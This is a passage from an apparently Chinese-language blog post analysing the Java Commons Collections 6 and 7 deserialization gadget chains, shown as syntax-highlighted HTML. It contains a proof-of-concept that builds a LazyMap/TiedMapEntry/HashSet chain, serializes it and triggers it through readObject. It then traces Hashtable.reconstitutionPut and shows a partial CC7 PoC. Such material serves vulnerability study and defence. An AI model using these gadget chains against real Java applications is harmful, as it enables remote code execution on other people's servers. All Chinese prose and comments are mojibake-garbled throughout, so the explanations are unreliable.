        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®©TiedMapEntryé‡Œçš„mapä¸ºlazyMap,keyéšæ„</span>

        <span class="token comment">//åˆ›å»ºHashSetçš„æ—¶å€™ï¼Œå…¶å†…éƒ¨å·²ç»åˆ›å»ºäº†ä¸€ä¸ªhashmapï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ªå†…éƒ¨ç”Ÿæˆçš„hashmapçš„keyå€¼æ”¹ä¸ºtiedMapEntryï¼Œå½“ä»–è¢«call putçš„æ—¶å€™ï¼Œåˆ©ç”¨é“¾å°±æˆåŠŸæ‰§è¡Œäº†ã€‚</span>

        <span class="token class-name">HashSet</span> hashSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å…ˆéšæ„ç»™å†…éƒ¨çš„mapæ·»åŠ ä¸€ä¸ªkey</span>
        <span class="token class-name">Field</span> map <span class="token operator">=</span> hashSet<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¾—åˆ°è¿™ä¸ªmap Field</span>
        map<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span> mapInHashSet <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HashMap</span><span class="token punctuation">)</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¾—åˆ°è¿™ä¸ªmapçš„å†…å®¹ -ã€‹ä¹Ÿå°±æ˜¯hashMap</span>

        <span class="token class-name">Field</span> table <span class="token operator">=</span> mapInHashSet<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä»è¿™ä¸ªhashmapä¸­è·å–table field</span>
        table<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> table<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mapInHashSet<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™ä¸ªtable fieldé‡Œé¢åŒ…å«äº†ç”±å„ç§é”®å€¼å¯¹ç»„æˆçš„æ•°ç»„</span>
        <span class="token comment">// æˆ‘ä»¬çš„ç›®çš„æ˜¯ä¿®æ”¹é‚£ä¸ªæˆ‘ä»¬ä¹‹å‰æ”¾è¿›å»çš„keyå€¼ï¼Œè®©ä»–ç­‰äºtiedMapEntry</span>

        <span class="token class-name">Object</span> node <span class="token operator">=</span> array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Object</span> i <span class="token operator">:</span> array<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//éå†è¿™ä¸ªé”®å€¼å¯¹æ•°ç»„ï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œå°±èµ‹å€¼ç»™nodeï¼Œä»è€Œå¾—åˆ°ä¸€å¯¹é”®å€¼å¯¹</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                node<span class="token operator">=</span>i<span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">/* ä¿®æ”¹å…¶ä¸­çš„keyå€¼ */</span>
        <span class="token class-name">Field</span> key <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        key<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        key<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span>tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>cc6ä¸­ç”¨<code>fakeTransformer</code>æ¥ç»•è¿‡å‘½ä»¤é‡å¤æ‰§è¡Œå¯ä»¥è¯´æ˜¯éå¸¸å¥½çš„æ€è·¯äº†ï¼Œè‡ªå·±åœ¨å®¡è®¡çš„æ—¶å€™ä¹Ÿå¯ä»¥å­¦ä¹ è¿™æ–¹é¢æ€è·¯ã€‚</p>
<h3 id="Reference-4"><a href="#Reference-4" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233410#h3-8">ysoserial CommonsCollections5/6 è¯¦ç»†åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">Javaå®‰å…¨-CommonsCollections6åˆ©ç”¨é“¾åˆ†æ</a></p>
<h2 id="Commons-Collections-7"><a href="#Commons-Collections-7" class="headerlink" title="Commons Collections 7"></a>Commons Collections 7</h2><h3 id="ç¯å¢ƒæ­å»º-6"><a href="#ç¯å¢ƒæ­å»º-6" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7</li>
</ul>
<h3 id="åˆ©ç”¨é“¾æ„é€ -3"><a href="#åˆ©ç”¨é“¾æ„é€ -3" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><h4 id="å‰è¨€-2"><a href="#å‰è¨€-2" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p><code>LazyMap.get()</code>ä¹‹åå¾—æ­¥éª¤å’Œä¹‹å‰çš„ccé“¾éƒ½å·®ä¸å¤šï¼Œè¿™é‡Œå°±ä¸å†è¯´äº†ã€‚</p>
<h4 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h4><p>æˆ‘ä»¬åœ¨<code>AbstractMap.equals()</code>ä¸­å‘ç°äº†<code>.get()</code>æ–¹æ³•</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206194914358.png" alt="image-20211206194914358" loading="lazy"></p>
<p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å˜é‡<code>m</code>ä¸ºlazyMapçš„è¯ï¼Œå°±èƒ½è¿ä¸Šåˆ©ç”¨é“¾äº†ã€‚</p>
<p>é‚£ä¹ˆä»€ä¹ˆè°ƒç”¨äº†<code>AbstractMap.equals()</code>å‘¢ï¼Ÿ</p>
<h4 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a>Hashtable.reconstitutionPut()</h4><p>æˆ‘ä»¬å‘ç°åœ¨<code>Hashtable</code>ä¸­ï¼Œ<code>reconstitutionPut()</code>æ–¹æ³•è°ƒç”¨äº†<code>e.key.equals()</code>ï¼Œæ—¢ç„¶æˆ‘ä»¬æƒ³è¦callåˆ°<code>AbstractMap.equals()</code>,é‚£æˆ‘ä»¬è®©ä¼ å…¥çš„<strong>e.key</strong>å˜æˆ<code>AbstractMap</code>æ˜¯ä¸æ˜¯å°±å¯ä»¥äº†å‘¢ï¼Ÿ</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">reconstitutionPut</span><span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> tab<span class="token punctuation">,</span> <span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span>
    <span class="token keyword">throws</span> <span class="token class-name">StreamCorruptedException</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// Makes sure the key is not already in the hashtable.</span>
    <span class="token comment">// This should not happen in deserialized version.</span>
    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span>hash <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span> <span class="token operator">%</span> tab<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//e=ä¼ å…¥tableé‡Œçš„ç¬¬ä¸€ä¸ªkey-valueå¯¹</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//æ­¤å¤„è°ƒç”¨äº†equals()</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// Creates the new entry.</span>
    <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
    tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    count<span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å‘ç°<code>HashMap</code>ç»§æ‰¿äº†<code>AbstractMap</code>ï¼Œå¦‚æœæˆ‘ä»¬çš„å˜é‡<code>e</code>ä¸º<code>lazyMap</code>ï¼Œå®ƒçš„keyå€¼åˆ™ä¸º<code>hashMap</code>ï¼Œä»è€Œæˆ‘ä»¬ä¼šcallåˆ°**hashMapçš„equals()**ï¼Œå°±èƒ½è§¦å‘æ¼æ´äº†ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206200746114.png" alt="image-20211206200746114" loading="lazy"></p>
<h4 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a>Hashtable.readObject()</h4><p>è·Ÿè¸ªå‘ç°<code>reconstitutionPut()</code>åˆšå¥½ä¼šè¢«<code>Hashtable.readObject()</code>æ‰€è°ƒç”¨ã€‚æ­¤å¤„çš„<code>newTable</code>æ˜¯æ–°çš„ï¼Œæˆ‘ä»¬æ— æ³•èµ‹å€¼ï¼Œä½†æ˜¯åœ¨<code>reconstitutionPut()</code>æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨forå¾ªç¯åé¢ï¼Œæœ‰ä¸€å¥<code>tab[index] = new Entry&lt;&gt;(hash, key, value, e);</code></p>
<p>è¿™æ˜¯å°†æˆ‘ä»¬çš„key-valueå¯¹å­˜å…¥è¿™ä¸ª<strong>tab</strong>ä¸­ï¼Œè€Œè¿™ä¸ªtabæ­£å¥½å¯¹åº”äº†<code>readObjcet()</code>é‡Œçš„<strong>newTable</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206201003311.png" alt="image-20211206201003311" loading="lazy"></p>
<hr>
<p><strong>é‡åˆ°çš„ä¸€äº›å›°æƒ‘ï¼š</strong></p>
<p>èµ·åˆæˆ‘å¾ˆç–‘æƒ‘<strong>newTable</strong>å’Œ<strong>tab</strong>çš„å…³ç³»ï¼Œåæ¥æˆ‘æ˜ç™½äº†ï¼Œ<strong>newTable</strong>ä½œä¸ºå‚æ•°<strong>tab</strong>ä¼ å…¥<code>reconstitutionPut()</code>åï¼Œåœ¨<code>reconstitutionPut()</code>ä¸­å¯¹<strong>tab</strong>çš„å˜åŒ–ä¹Ÿæ˜¯ä¼šå½±å“åˆ°<strong>newTable</strong>çš„ - ä¹Ÿå°±æ˜¯æ‰€è°“çš„<strong>sideffect</strong>ï¼Œä¸‹é¢æˆ‘åšäº†ä¸ªå®éªŒï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Teacher</span> teacher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Teacher</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ª28å²çš„è€å¸ˆ</span>
        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span>teacher<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æŠŠè€å¸ˆçš„instanceä¼ ç»™å­¦ç”Ÿ</span>
        <span class="token comment">//å­¦ç”Ÿä¼šæŠŠä¼ ç»™å®ƒçš„è€å¸ˆæ”¹æˆ53å²</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>teacher<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ‰“å°è€å¸ˆçš„å¹´é¾„</span>
        <span class="token comment">//è¾“å‡ºç»“æœä¸º53å²</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token class-name">Teacher</span> teacher<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        teacher<span class="token punctuation">.</span><span class="token function">modifyAge</span><span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Teacher</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Teacher</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">modifyAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>å†çœ‹<code>Hashtable.writeObject()</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectOutputStream</span> s<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token class-name">V</span><span class="token punctuation">></span></span> entryStack <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Write out the length, threshold, loadfactor</span>
        s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Write out length, count of elements</span>
        s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Stack copies of the entries in the table</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> index <span class="token operator">&lt;</span> table<span class="token punctuation">.</span>length<span class="token punctuation">;</span> index<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> entry <span class="token operator">=</span> table<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">while</span> <span class="token punctuation">(</span>entry <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                entryStack <span class="token operator">=</span>
                    <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span>key<span class="token punctuation">,</span> entry<span class="token punctuation">.</span>value<span class="token punctuation">,</span> entryStack<span class="token punctuation">)</span><span class="token punctuation">;</span>
                entry <span class="token operator">=</span> entry<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// Write out the key/value objects from the stacked entries</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>entryStack <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>entryStack<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>entryStack<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        entryStack <span class="token operator">=</span> entryStack<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œå°†Hashtableé‡Œçš„key-valueå¯¹ç»™åºåˆ—åŒ–äº†ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦æ„é€ keyå€¼ä¸º<strong>lazyMap</strong>å°±å¯ä»¥äº†ã€‚</p>
<p>æˆ‘ä»¬åˆæ­¥çš„POCå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>

<span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†æ˜¯è¿™ä¸ªPOCæ˜¯æœ‰é—®é¢˜çš„ã€‚</p>
